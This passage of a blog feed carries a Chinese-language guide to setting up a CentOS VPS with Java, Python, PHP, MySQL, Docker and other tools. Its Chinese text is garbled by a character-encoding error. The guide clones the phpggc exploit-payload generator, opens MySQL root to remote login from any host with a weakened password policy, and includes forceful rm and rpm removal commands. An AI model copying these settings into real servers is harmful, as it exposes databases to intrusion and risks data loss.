class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf jdk-7u80-linux-x64.tar.gz -C /opt/java</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 7</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk1.7.0_80</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk1.7.0_80</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Javaåˆ‡æ¢JDK-ç‰ˆæœ¬"><a href="#Javaåˆ‡æ¢JDK-ç‰ˆæœ¬" class="headerlink" title="Javaåˆ‡æ¢JDK ç‰ˆæœ¬"></a>Javaåˆ‡æ¢JDK ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†Javaç›®å½•åŠ å…¥JDKé€‰æ‹©åˆ—è¡¨</span></span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk-11/bin/java  11</span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.8.0_77/bin/java  8</span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.7.0_80/bin/java  7</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ¢ç‰ˆæœ¬é€‰æ‹©éœ€è¦jdkçš„ç‰ˆæœ¬</span></span><br><span class="line">update-alternatives  --config  java     </span><br></pre></td></tr></table></figure><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>å®‰è£…Javaæ‰“åŒ…ç¨‹åº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//dlcdn.apache.org/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span></span><br><span class="line">tar -xvf  apache-maven-<span class="number">3.6</span><span class="number">.3</span>-bin.tar.gz</span><br><span class="line">mv -f apache-maven-<span class="number">3.6</span><span class="number">.3</span> /usr/local/</span><br><span class="line">rm -rf apache-maven-<span class="number">3.6</span><span class="number">.3</span>-bin.tar.gz</span><br></pre></td></tr></table></figure><p>æ·»åŠ ç¯å¢ƒå˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># maven</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/usr/<span class="built_in">local</span>/apache-maven-3.6.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;MAVEN_HOME&#125;</span>/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">mvn -v</span><br></pre></td></tr></table></figure><h2 id="Python-3-9-7"><a href="#Python-3-9-7" class="headerlink" title="Python 3.9.7"></a>Python 3.9.7</h2><p><a href="https://note.qidong.name/2021/05/multiple-python/">https://note.qidong.name/2021/05/multiple-python/</a></p><p>Linux å®‰è£…</p><p>1.æŸ¥çœ‹Python ç‰ˆæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -V</span><br><span class="line"><span class="comment"># CentOS 7 ä¸­è‡ªå¸¦çš„pythonç‰ˆæœ¬æ˜¯python-2.7.5 ,pythonæ˜¯3.6çš„å¾ˆå¤šç‰ˆæœ¬éœ€è¦3.7çš„æ‰€éœ€éœ€è¦å®‰è£…é«˜ç‰ˆæœ¬ï¼Œ</span></span><br></pre></td></tr></table></figure><p>2.ä¸‹è½½å®‰è£…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/<span class="number">3.9</span><span class="number">.7</span>/Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz</span><br><span class="line">tar -xvJf Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz</span><br><span class="line">yum install -y zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc  libffi-devel</span><br><span class="line">cd Python-<span class="number">3.9</span><span class="number">.7</span></span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cd ..</span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz Python-<span class="number">3.9</span><span class="number">.7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½</span></span><br><span class="line"><span class="comment"># è§£å‹</span></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–åŒ…</span></span><br><span class="line"><span class="comment"># è¿›å…¥pythonç›®å½•</span></span><br><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br></pre></td></tr></table></figure><p>3.åˆ›å»ºé“¾æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/python3<span class="number">.9</span> /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/pip3<span class="number">.9</span> /usr/<span class="built_in">bin</span>/pip3</span><br><span class="line"><span class="comment"># åˆ›å»ºpython3é“¾æ¥</span></span><br><span class="line"><span class="comment"># åˆ›å»ºpip3é“¾æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ›´æ–° pip</span></span><br><span class="line">/usr/local/python3/<span class="built_in">bin</span>/python3<span class="number">.9</span> -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>4.ä¿®æ”¹yumé…ç½®ï¼ˆå¯é€‰ï¼‰</p><p>å› ä¸ºæ‰§è¡Œyuméœ€è¦python2ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦ä¿®æ”¹yumçš„é…ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/<span class="built_in">bin</span>/yum</span><br><span class="line"><span class="comment">#! /usr/bin/pythonä¿®æ”¹ä¸º#! /usr/bin/python2</span></span><br><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line"><span class="comment">#! /usr/bin/python ä¹Ÿè¦ä¿®æ”¹ä¸º#! /usr/bin/python2</span></span><br></pre></td></tr></table></figure><p>5.åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰ï¼‰</p><p><a href="https://www.huaweicloud.com/articles/0cd569e4f8aab86e7f4ec3be6adce8fb.html">virtualenv</a> æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨åŒä¸€è®¡ç®—æœºä¸­éš”ç¦»å¤šä¸ªpythonç‰ˆæœ¬çš„å·¥å…·ã€‚å¦‚ python2.7 / python3.9 ï¼Œä½†æ˜¯å¦‚æœéƒ½è£…åˆ°ä¸€èµ·ï¼Œç»å¸¸ä¼šå¯¼è‡´é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install virtualenv</span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ–‡ä»¶è·¯å¾„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="comment">#åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ </span></span><br><span class="line">VIRTUALENVWRAPPER_PYTHON=/usr/local/python3/<span class="built_in">bin</span>/python3 <span class="comment"># æŒ‡å®švirtualenvwrapperæ‰§è¡Œçš„pythonç‰ˆæœ¬</span></span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs <span class="comment"># æŒ‡å®šè™šæ‹Ÿç¯å¢ƒå­˜æ”¾ç›®å½•ï¼Œ.virtualenvsç›®å½•åå¯è‡ªæ‹Ÿ</span></span><br><span class="line">source /usr/local/python3/<span class="built_in">bin</span>/virtualenvwrapper.sh <span class="comment"># virtualenvwrapper.shæ‰€åœ¨ç›®å½•</span></span><br></pre></td></tr></table></figure><p>å®‰è£…virtualenv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/virtualenv /usr/local/<span class="built_in">bin</span>/virtualenv</span><br><span class="line">mkvirtualenv --python=/usr/<span class="built_in">bin</span>/python3 py3-env</span><br></pre></td></tr></table></figure><p>6.å¸è½½ Python3 ï¼ˆå¯é€‰ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¸è½½pyhton3</span></span><br><span class="line">rpm -qa|grep python3|xargs rpm -ev --allmatches --nodeps</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤æ‰€æœ‰æ®‹ä½™æ–‡ä»¶</span></span><br><span class="line">whereis python3 |xargs rm -frv</span><br><span class="line"><span class="comment">#å¸è½½å®Œæˆ</span></span><br><span class="line"><span class="comment">#æŸ¥çœ‹ç°æœ‰çš„å·²å®‰è£…çš„python</span></span><br><span class="line">whereis python</span><br></pre></td></tr></table></figure><h2 id="Python-2-æ‰©å±•"><a href="#Python-2-æ‰©å±•" class="headerlink" title="Python 2 æ‰©å±•"></a>Python 2 æ‰©å±•</h2><p>Centos7 é»˜è®¤è‡ªå¸¦ Python 2.7.5 ç‰ˆæœ¬ï¼Œä½†æ˜¯ç¼ºå°‘ pipåº“ ä»¥åŠå¸¸ç”¨çš„æ¨¡å—ï¼Œè¿™é‡Œåˆ—ä¸¾äº†ï¼Œæ¨¡å—çš„å®‰è£…æ–¹å¼ï¼Œå¦‚æœpip å®‰è£…ä¸æˆåŠŸï¼Œå¯ä»¥å°è¯•é€šè¿‡å»å®˜ç½‘ä¸‹è½½ç¼–è¯‘å®‰è£…</p><p>Python2çš„å¸¸ç”¨çš„åº“   <a href="https://pypi.org/">https://pypi.org/</a></p><p>å®‰è£…æ–¹å¼åˆ—ä¸¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… setuptools</span></span><br><span class="line">wget https://pypi.python.org/packages/<span class="number">45</span>/<span class="number">29</span>/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span><span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span> </span><br><span class="line">cd setuptools-<span class="number">36.6</span><span class="number">.0</span></span><br><span class="line">python setup.py install</span><br><span class="line">cd .. </span><br><span class="line">rm -rf setuptools-<span class="number">36.6</span><span class="number">.0</span> setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… requests</span></span><br><span class="line">wget https://pypi.python.org/packages/5b/0b/34be574b1ec997247796e5d516f3a6b6509c4e064f2885a96ed885ce7579/requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz</span><br><span class="line">tar -zxvf requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz</span><br><span class="line">cd requests-<span class="number">2.12</span><span class="number">.4</span></span><br><span class="line">python setup.py install</span><br><span class="line">cd ..</span><br><span class="line">rm -rf requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz requests-<span class="number">2.12</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>å®‰è£… pip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/<span class="number">11</span>/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz<span class="comment">#md5=35f01da33009719497f01a4ba69d63c9</span></span><br><span class="line">tar -zxvf pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz</span><br><span class="line">cd pip-<span class="number">9.0</span><span class="number">.1</span></span><br><span class="line">python setup.py install</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">cd ..</span><br><span class="line">rm -rf pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz pip-<span class="number">9.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h2 id="PHP-ç¯å¢ƒå®‰è£…"><a href="#PHP-ç¯å¢ƒå®‰è£…" class="headerlink" title="PHP ç¯å¢ƒå®‰è£…"></a>PHP ç¯å¢ƒå®‰è£…</h2><h3 id="PHP7-3"><a href="#PHP7-3" class="headerlink" title="PHP7.3"></a>PHP7.3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install -y epel-release yum-utils</span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm</span><br><span class="line">yum install -y php73-php-fpm php73-php-cli php73-php-bcmath php73-php-gd php73-php-json php73-php-mbstring php73-php-mcrypt php73-php-mysqlnd php73-php-opcache php73-php-pdo php73-php-pecl-crypto php73-php-pecl-mcrypt php73-php-pecl-geoip php73-php-pecl-swoole php73-php-recode php73-php-snmp php73-php-soap php73-php-xmll</span><br><span class="line">ln -s /opt/remi/php73/root/usr/bin/php /usr/bin/php</span><br></pre></td></tr></table></figure><h3 id="phpggc"><a href="#phpggc" class="headerlink" title="phpggc"></a>phpggc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ambionics/phpggc.git</span><br></pre></td></tr></table></figure><h2 id="MySQL-å®‰è£…"><a href="#MySQL-å®‰è£…" class="headerlink" title="MySQL å®‰è£…"></a>MySQL å®‰è£…</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><p><a href="https://cloud.tencent.com/developer/article/1886339">https://cloud.tencent.com/developer/article/1886339</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># centos 7</span></span><br><span class="line">wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">rpm -Uvh mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">yum install -y mysql-community-server</span><br><span class="line">systemctl start mysqld.service</span><br><span class="line">systemctl status mysqld.service</span><br><span class="line">systemctl <span class="built_in">enable</span> mysqld</span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥è¯¢å¯†ç </span></span><br><span class="line">grep <span class="string">&#x27;temporary password&#x27;</span> /var/<span class="built_in">log</span>/mysqld.log </span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å¯†ç å¤æ‚åº¦</span></span><br><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="built_in">set</span> global validate_password_length=1;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®å¯†ç </span></span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;yourpassword&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆæƒå…¶ä»–æœºå™¨è¿œç¨‹ç™»å½•</span></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;yourpassword&#x27;</span> WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹ä¸ºUTF-8 ä¿®æ”¹å†…å®¹å¦‚ä¸‹</span></span><br><span class="line">vim /etc/my.cnf</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">character_set_server=utf8</span><br><span class="line"> </span><br><span class="line">symbolic-links=0</span><br><span class="line"> </span><br><span class="line">log-error=/var/<span class="built_in">log</span>/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯</span></span><br><span class="line">service mysqld restart</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ·»åŠ é˜²ç«å¢™è§„åˆ™</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line">firewall-cmd --zone=public --add-port=3306/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>å¸è½½MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep mysql</span><br><span class="line">yum -y remove mysql57-community-release-el7-10.noarch</span><br></pre></td></tr></table></figure><h2 id="Redis-å®¢æˆ·ç«¯"><a href="#Redis-å®¢æˆ·ç«¯" class="headerlink" title="Redis å®¢æˆ·ç«¯"></a>Redis å®¢æˆ·ç«¯</h2><p>æ˜¯è¿æ¥ç”¨çš„å®¢æˆ·ç«¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar xvzf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make</span><br><span class="line">sudo cp src/redis-cli /usr/local/<span class="built_in">bin</span>/</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure><h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><p>node-v16.15.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/<span class="built_in">local</span>/node</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/node</span><br><span class="line">wget https://npmmirror.com/mirrors/node/v16.15.0/node-v16.15.0-linux-x64.tar.xz</span><br><span class="line">tar xf node-v16.15.0-linux-x64.tar.xz </span><br><span class="line">rm -rf node-v16.15.0-linux-x64.tar.xz  </span><br><span class="line"></span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/node/node-v16.15.0-linux-x64/bin/npm /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/node/node-v16.15.0-linux-x64/bin/node /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure><h2 id="Rubyå®‰è£…"><a href="#Rubyå®‰è£…" class="headerlink" title="Rubyå®‰è£…"></a>Rubyå®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://cache.ruby-lang.org/pub/ruby/3.1/ruby-3.1.2.tar.gz</span><br><span class="line">tar zxvf ruby-3.1.2.tar.gz</span><br><span class="line">rm -rf ruby-3.1.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ruby-3.1.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="Goç¯å¢ƒ"><a href="#Goç¯å¢ƒ" class="headerlink" title="Goç¯å¢ƒ"></a>Goç¯å¢ƒ</h2><h3 id="1-Linux"><a href="#1-Linux" class="headerlink" title="1.Linux"></a>1.Linux</h3><p>go å®˜ç½‘ ï¼š<a href="https://golang.org/dl/">https://golang.org/dl/</a></p><p>å®‰è£…æ•™ç¨‹ï¼š<a href="https://www.runoob.com/go/go-environment.html">https://www.runoob.com/go/go-environment.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.17.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/<span class="built_in">local</span> -xzf go1.17.linux-amd64.tar.gz</span><br><span class="line">rm -rf go1.17.linux-amd64.tar.gz go1.17.linux-amd64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment"># go</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/usr/local/go/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><p>è®¾ç½®å›½å†…ä»£ç† !!!!    VPSåœ¨å›½å¤–å¯å¿½ç•¥</p><p><a href="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md">https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure><h3 id="2-windows"><a href="#2-windows" class="headerlink" title="2.windows"></a>2.windows</h3><p>åœ¨powershellè¿è¡Œï¼Œåˆ‡æ¢å›½å†…ä»£ç†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span>:GO111MODULE = <span class="string">&quot;on&quot;</span></span><br><span class="line"><span class="variable">$env</span>:GOPROXY = <span class="string">&quot;https://goproxy.cn&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Docker-ç¯å¢ƒ"><a href="#Docker-ç¯å¢ƒ" class="headerlink" title="Docker ç¯å¢ƒ"></a>Docker ç¯å¢ƒ</h2><p>1.æ£€æŸ¥ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure><p>2.å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc gcc-c++</span><br><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2 </span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">yum makecache fast</span><br><span class="line">yum -y install docker-ce docker-ce-cli containerd.io docker-compose</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line">docker version</span><br><span class="line">docker run hello-world</span><br><span class="line">yum update -y</span><br><span class="line">curl -L https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/1.23.2/docker-compose-`uname -s`-`uname -m` -o /usr/bin/docker-compose</span><br><span class="line">chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p>3.å¸è½½docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker </span><br><span class="line">yum -y remove docker-ce</span><br><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">åœ¨æˆ‘ä»¬è´­ä¹°vpsæˆ–è€…æ¢æœåŠ¡å™¨ï¼Œè¦å¸¸å¸¸æ­å»ºç¯å¢ƒï¼Œå¦‚pythonã€goã€javaç­‰ï¼Œä»¥åŠåŸºç¡€å·¥å…·ï¼ŒæŒç»­æ›´æ–°~~</summary>
    
    
    
    <category term="vpsç¯å¢ƒ" scheme="https://fz1lin.com/categories/vps%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="vps" scheme="https://fz1lin.com/tags/vps/"/>
    
    <category term="ç¯å¢ƒ" scheme="https://fz1lin.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>redisæœªæˆæƒè®¿é—®</title>
    <link href="https://fz1lin.com/2022/1972078239/"/>
    <id>https://fz1lin.com/2022/1972078239/</id>
    <published>2022-02-15T12:53:52.000Z</published>
    <updated>2022-05-18T14:28:30.057Z</updated>
    
